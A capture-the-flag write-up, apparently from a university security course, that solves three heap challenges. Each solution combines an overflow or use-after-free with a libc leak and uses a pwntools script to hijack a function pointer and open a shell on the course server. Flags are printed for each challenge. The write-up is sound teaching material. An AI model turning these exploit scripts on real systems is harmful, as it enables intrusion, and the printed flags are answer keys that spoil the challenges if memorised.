heap 1 | `babys_first_1`
===========================

Flag: `6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}`

General overview of problems faced
-------------------------------------
Had difficulty understanding what the goal of a Heap Overflow was.
Had to learn about heap and how to use gdb in order to print heap, bins etc.

List of vulnerabilities
--------------------
1. The name of the fish is taken from STDIN using `scanf(%s)` which allows arbitrary length inputh to be passed. This means we can overflow the buffer and write bytes after it.
2. Each allocated bin when creating a fish contains the address of the `puts` function which is used during program execution
3. The binary contains a function which call `system('/bin/sh')` allowing an attacker to point to it when doing a stack or heap overflow.

Steps to exploit
------------------
1. Get the address of the function which calls a shell from the binary (0x08048690)
2. Create a fish at position 0 with any size, weight and set the name to be 102 bytes of offset + the address of the win function in little endian format (`\x90\x86\x04\x08`)
3. View the fish you created
4. You now have a shell.

Script/Command used
------------------
```python
from pwn import *

# Flag: 6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}

p = remote('wargames.6447.sec.edu.au', 9001)

p.sendline("1") # create a fish
p.sendline("0") # at position 0
p.sendline("10") # size
p.sendline("10") # weight
p.sendline('A' * 102 + '\x90\x86\x04\x08') # name

p.sendline("3") # view fish
p.sendline("0") # at position 0

p.recvrepeat(0.2)

print "Shell enabled."

p.interactive()
```

===============================================================
===============================================================

heap 2 | `babys_first_2`
===========================

Flag: `6447{b20e6d03-f58c-43b7-974a-f801bb9a2fb5}`

General overview of problems faced
-------------------------------------
Had to learn about UAF vulnerabilities and how to use and abuse them.

List of vulnerabilities
--------------------
1. `Use after free`: It is possible to create a fish, delete it and then view it after it has been delete.
2. When deleting a fish and freeing an allocated bin, the data is not overwriten/removed from memory. Therefore allocating another bin to the same address allows memory leaks and  overwriting of addresses which might still be used because of the UAF vulnerability
3. Each allocated bin when creating a fish contains an address to the `puts` function which is used during the program execution
4. The binary contains an unused function with a `system("/bin/sh")` call allowing an attack to point to it when doing stack or heap overflows.

Steps to exploit
------------------
1. Get the address of the function which calls a shell from the binary (0x080486C0)
2. Create a fish at position 0 with any size, weight and name
3. Delete the fish at position 0
4. Create a fish at position 1 with any size and weight but set the name to be 38 bytes of offset + the addres of the function you want to jump to in little endian format ("\xc0\x86\x04\x08")
5. View the fish you created
6. You now have a shell!

Script/Command used
------------------
```python
from pwn import *

#Flag: 6447{b20e6d03-f58c-43b7-974a-f801bb9a2fb5}

p = remote('wargames.6447.sec.edu.au', 9002)

p.sendlineafter("> ", "1") # create a fish
p.sendlineafter("> ", "0") # at position 0
p.sendlineafter("> ","10") # size
p.sendlineafter("> ","10") # weight
p.sendlineafter("> ","awesome name") # name

p.sendlineafter("> ","4") # delete fish
p.sendlineafter("> ","0") # at position 0

p.sendlineafter("> ","1") # create a fish
p.sendlineafter("> ","1") # at position 1
p.sendlineafter("> ","100") # size
p.sendlineafter("> ","100") # weight
p.sendlineafter("> ","A"*38 + "\xc0\x86\x04\x08") # name

p.sendlineafter("> ","3") # view fish
p.sendlineafter("> ","0") # at position 0

print p.recvrepeat(0.2)

p.interactive()
```


============================================
============================================

heap 3 | `babys_first_3`
===========================

Flag: `6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}`

General overview of problems faced
-------------------------------------
Had an issue where I was sending 1 extra byte because of the newline being sent with the input when using `sendlineafter()`

List of vulnerabilities
--------------------
1. `Use after free`: It is possible to create a fish, delete it and then view it after it has been deleted and the allocated bin has been freed.
2. When deleting a fish and freeing an allocated bin, the data is not overwriten/removed from memory. Therefore allocating another bin to the same address allows memory leaks and overwriting of addresses which might still be used because of the UAF vulnerability
3. The heap contains a pointer to the `fputs` function addresses which is used during program execution
4. `Memory leak`: it is possible to leak libc memory addresses which can then be used to calculate `system` and `bin_sh_string` address from it.

Steps to exploit
------------------
1. Create a fish at position 0 with any size, weight and name
2. Delete the fish at position 0
3. Create a fish at position 1 with any size and weight and a name 8 bytes long such as "AAAAAAA\n"
4. View fish at position 1 and record the memory address leaked. (this is the address of fputs)
5. Use a libc database to find the offsets based on the leaked fputs address and the corresponding libc version.
6. calculate the system and "/bin/sh" string libc addresses using the offsets and the fputs address
7. Update the fish's name at position 1 to be : 8 bytes of offset + the address of system in little endian format + the address of bin/sh in little endian format
8. View fish at position 0
9. Congratulations you now have a shell!

Script/Command used
------------------
```python
from pwn import *

# Flag: 6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}

p = remote('wargames.6447.sec.edu.au', 9003)

p.sendlineafter("> ", "1") # create a fish
p.sendlineafter("> ", "0") # at position 0
p.sendlineafter("> ","10") # size
p.sendlineafter("> ","10") # weight
p.sendlineafter("> ","AAAA") # name

p.sendlineafter("> ","4") # delete fish
p.sendlineafter("> ","0") # at position 0

p.sendlineafter("> ","1") # create a fish
p.sendlineafter("> ","1") # at position 1
p.sendlineafter("> ","9") # size
p.sendlineafter("> ","9") # weight
p.sendlineafter("> ","A"*7) # name

p.sendlineafter("> ","3") # view fish
p.sendlineafter("> ","1") # at position 1

mem_leak = p.recvuntil("> ") # receive memory address leak

print mem_leak

leak = mem_leak[8:12].encode("hex")
leak = "".join([leak[i:i+2] for i in range(0, len(leak), 2)][::-1])
leak = int(leak, 16)

system = leak + -0x23d40
bin_sh = leak + 0x1008af

print hex(leak), hex(system), hex(bin_sh)

p.sendline("2") # update a fish
p.sendlineafter("> ","1") # at position 1
p.sendlineafter("> ","115") # size
p.sendlineafter("> ","115") # weight
p.sendlineafter("> ", 'A' * 8 + p32(system) + p32(bin_sh)) # name

p.sendlineafter("> ","3") # view fish
p.sendlineafter("> ","0") # at position 0

print "BOOYYYYAAAAAH! Shell acquired!"
p.interactive()
```
